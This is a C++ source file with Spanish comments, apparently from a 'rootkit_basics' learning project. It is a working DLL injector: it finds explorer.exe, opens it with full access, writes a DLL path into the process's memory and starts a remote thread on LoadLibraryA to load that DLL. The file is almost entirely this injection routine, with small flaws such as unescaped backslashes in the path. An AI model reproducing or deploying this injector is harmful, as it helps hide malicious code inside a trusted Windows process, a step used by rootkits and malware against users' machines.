/*
* FehuC++.cpp : Este archivo contiene la función "main".
* La ejecución del programa comienza y termina ahí.
*/

#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <comdef.h>

using namespace std;

HANDLE process;
LPVOID remoteString;
LPVOID loadLibrary = NULL;
int CURRENT_PROCESS_ID = 0;
HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, CURRENT_PROCESS_ID);
PROCESSENTRY32 processInfo;
std::string targetProcessName = "explorer.exe";
std::int32_t targetProcessPID = -1;
boolean ERROR_404 = false;
const char* pathDLL = "C:\\Users\eyver\Documents\gitHub_R\rootkit_basics\Release\FehuDLL.dll";

void loadDLL() {

    process = OpenProcess(
        PROCESS_ALL_ACCESS,
        false,
        targetProcessPID
    );

    loadLibrary = (LPVOID) GetProcAddress(
        GetModuleHandle(L"kernel32.dll"),
        "LoadLibraryA"
    );

    remoteString = (LPVOID)VirtualAllocEx(
        process,
        NULL,
        strlen(pathDLL),
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE
    );


    WriteProcessMemory(
        process,
        (LPVOID) remoteString,
        pathDLL,
        strlen(pathDLL),
        NULL
    );

    CreateRemoteThread(
        process,
        NULL,
        NULL,
        (LPTHREAD_START_ROUTINE) loadLibrary,
        (LPVOID) remoteString,
        NULL,
        NULL
    );

    CloseHandle(process);
}

int findProcess() {
    boolean flag = true;
    while (Process32Next(handle, &processInfo) && flag) {
        std::wstring ws(processInfo.szExeFile);
        std::string str(ws.begin(), ws.end());
        //std::cout << str << "|" << processInfo.th32ProcessID << "\n";
        if (str == targetProcessName) {
            targetProcessPID = processInfo.th32ProcessID;
            flag = false;
        }
    }
    CloseHandle(handle);
    if (targetProcessPID == -1) {
        std::cout << "PID NOT FOUND";
        return -1;
    }
    return targetProcessPID;
}

boolean badResources() {
    if (handle == INVALID_HANDLE_VALUE) {
        std::cout << "ERROR SNAPSHOOT";
        CloseHandle(handle);
        return true;
    }

    processInfo.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(handle, &processInfo)) {
        std::cout << "ERROR FIRST_PROCESS";
        CloseHandle(handle);
        return true;
    }

    return false;
}

int main() {
    if (badResources())
        return 0;
    targetProcessPID = findProcess();
    if (targetProcessPID == -1) {
        return 0;
    } else {
        cout << "PID ::" << targetProcessPID;
    }
    loadDLL();
}

/*
* Ejecutar programa: Ctrl + F5 > Iniciar sin depurar
* Depurar programa: F5 > Iniciar depuración
*/